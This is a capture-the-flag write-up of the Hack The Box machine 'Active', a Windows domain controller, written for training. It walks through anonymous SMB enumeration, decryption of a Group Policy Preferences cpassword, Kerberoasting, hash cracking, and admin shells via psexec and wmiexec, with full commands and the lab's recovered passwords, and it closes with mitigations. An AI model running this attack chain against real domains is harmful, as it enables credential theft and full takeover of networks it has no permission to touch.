## Box Information

- **Box Name:** Active
- **IP Address:** 10.129.14.187
- **Domain:** active.htb
- **OS:** Windows Server 2008 R2 SP1
- **Difficulty:** Easy

---

## Reconnaissance

### Nmap Scan

```bash
nmap -Svc -p- --min-rate 5000 -v -oN nmap 10.129.14.187

```

**Key Ports Discovered:**

- 53/tcp - DNS (Microsoft DNS 6.1.7601)
- 88/tcp - Kerberos
- 135/tcp - MSRPC
- 139/tcp - NetBIOS-SSN
- 389/tcp - LDAP (Active Directory)
- 445/tcp - SMB
- 464/tcp - Kerberos Password Change
- 593/tcp - RPC over HTTP
- 636/tcp - LDAPS
- 3268/tcp - Global Catalog LDAP
- 5722/tcp - MSRPC
- 9389/tcp - .NET Message Framing

**Key Findings:**

- Domain Controller identified
- SMB signing enabled and required
- Kerberos authentication available

---

## Enumeration

### SMB Enumeration - Anonymous Access

**Using NetExec for Share Enumeration:**

```bash
nxc smb 10.129.14.187 -u '' -p '' --shares

```

**Accessible Shares:**

- ADMIN$ - Remote Admin (no access)
- C$ - Default share (no access)
- IPC$ - Remote IPC
- NETLOGON - Logon server share (READ)
- **Replication - READ ACCESS** ⭐
- SYSVOL - Logon server share (READ)
- Users - (no anonymous access)

**Alternative using smbclient:**

```bash
smbclient -L //10.129.14.187 -N

```

### Exploring Replication Share

```bash
smbclient //10.129.14.187/Replication -N

```

**Navigation:**

```bash
cd active.htb
cd Policies
cd {31B2F340-016D-11D2-945F-00C04FB984F9}
ls

```

**Files Found:**

- GPT.INI
- Group Policy (directory)
- MACHINE (directory)
- USER (directory)

### Downloading Groups.xml (GPP Password)

```bash
cd MACHINE
cd Preferences
cd Groups
get Groups.xml

```

---

## Initial Access - GPP Password Attack

### Groups.xml Analysis

```bash
cat Groups.xml

```

**Content Found:**

```xml
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
      name="active.htb\SVC_TGS"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      userName="active.htb\SVC_TGS"/>

```

**Key Information:**

- Username: `active.htb\SVC_TGS`
- Encrypted password (cpassword) found
- Account settings: never expires, cannot be changed by user

### Decrypting GPP Password

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

```

**Credentials Obtained:**

- Username: `SVC_TGS`
- Password: `GPPstillStandingStrong2k18`

### Credential Validation

```bash
nxc smb 10.129.14.187 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares

```

**Result:** ✅ Valid credentials confirmed

**Accessible Shares with SVC_TGS:**

- NETLOGON - READ
- Replication - READ
- SYSVOL - READ
- Users - READ

---

## User Flag

### Accessing Users Share

```bash
smbclient //10.129.14.187/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'

```

**Navigation:**

```bash
cd SVC_TGS\Desktop
more user.txt

```

**Alternative - Download user.txt:**

```bash
get user.txt

```

---

## Privilege Escalation - Kerberoasting

### Kerberoasting Attack

```bash
nxc ldap active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoasting -

```

**Result:** Administrator account has SPN (Service Principal Name)

**Hash Obtained:**

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$[...hash...]

```

**Alternative using Impacket:**

```bash
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.14.187 -request

```

### Cracking the Kerberos Ticket

**Save hash to file:**

```bash
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$...' > admin_hash.txt

```

**Crack with Hashcat:**

```bash
hashcat -m 13100 admin_hash.txt /usr/share/wordlists/rockyou.txt --force

```

**Alternative - John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt

```

**Administrator Credentials:**

- Username: `Administrator`
- Password: `Ticketmaster1968`

### Credential Validation

```bash
nxc smb 10.129.14.187 -u 'Administrator' -p 'Ticketmaster1968' -d active.htb

```

**Result:** ✅ Administrator access confirmed

---

## Root Flag

### Accessing C$ Share as Administrator

```bash
smbclient //10.129.14.187/C$ -U 'Administrator%Ticketmaster1968'

```

**Navigation:**

```bash
cd Users\Administrator\Desktop
more root.txt

```

**Alternative - Download root.txt:**

```bash
get root.txt

```

### Alternative Methods

**Using NetExec to execute commands:**

```bash
nxc smb 10.129.14.187 -u 'Administrator' -p 'Ticketmaster1968' -x 'type C:\Users\Administrator\Desktop\root.txt'

```

**Using PSExec for shell access:**

```bash
psexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.14.187

```

**Using WMIExec:**

```bash
wmiexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.14.187

```

---

## Attack Chain Summary

1. **Reconnaissance** → Nmap scan identified Domain Controller with SMB and Kerberos
2. **Anonymous SMB Access** → Found Replication share with READ access
3. **GPP Password Discovery** → Located Groups.xml in Group Policy preferences
4. **Credential Recovery** → Decrypted cpassword → `SVC_TGS:GPPstillStandingStrong2k18`
5. **User Access** → Accessed Users share and retrieved user.txt
6. **Kerberoasting** → Extracted Administrator Kerberos ticket using SVC_TGS credentials
7. **Hash Cracking** → Cracked TGS ticket → `Administrator:Ticketmaster1968`
8. **Administrator Access** → Used Admin credentials to access C$ share and retrieve root.txt

---

## Key Vulnerabilities

### 1. Group Policy Preferences (GPP) Password Storage

- **CVE:** MS14-025
- **Impact:** Credentials stored in SYSVOL with reversible encryption
- **Exploitation:** Anonymous SMB access to Replication share → Groups.xml discovery
- **Mitigation:**
    - Remove cpassword attributes from Group Policy
    - Use LAPS (Local Administrator Password Solution)
    - Regularly audit SYSVOL for sensitive data

### 2. Kerberoasting

- **Impact:** Service accounts with SPNs vulnerable to offline password cracking
- **Exploitation:** Valid domain credentials → Request TGS tickets → Offline cracking
- **Mitigation:**
    - Use strong passwords (25+ characters) for service accounts
    - Implement Managed Service Accounts (MSA/gMSA)
    - Monitor for suspicious TGS requests
    - Enable AES encryption for Kerberos

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| Nmap | Port scanning and service enumeration |
| smbclient | SMB share enumeration and file access |
| NetExec (nxc) | Credential validation, Kerberoasting, command execution |
| gpp-decrypt | Decrypting Group Policy Preferences passwords |
| GetUserSPNs.py | Alternative Kerberoasting tool (Impacket) |
| Hashcat | Cracking Kerberos TGS tickets |
| PSExec/WMIExec | Remote command execution (alternative methods) |

---

## Lessons Learned

1. **Always check for anonymous SMB access** - Replication and SYSVOL shares often contain sensitive information
2. **GPP passwords are easily decryptable** - Microsoft published the AES key used for encryption
3. **Service account names matter** - `SVC_TGS` immediately suggests Kerberos Ticket Granting Service
4. **Kerberoasting is powerful** - Any domain user can request service tickets for offline cracking
5. **Old systems = known vulnerabilities** - Windows Server 2008 R2 has multiple documented attack vectors

---

## Additional Notes

- Service account `SVC_TGS` had sufficient privileges for Kerberoasting but limited system access
- Administrator password was found in rockyou.txt wordlist (common password)

---

## References

- [Group Policy Preferences Password Vulnerability](https://adsecurity.org/?p=2288)
- [Kerberoasting Explained](https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/)
- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [NetExec Documentation](https://www.netexec.wiki/)

---

**Box Completed:** ✅
**User Flag:** ✅
**Root Flag:** ✅
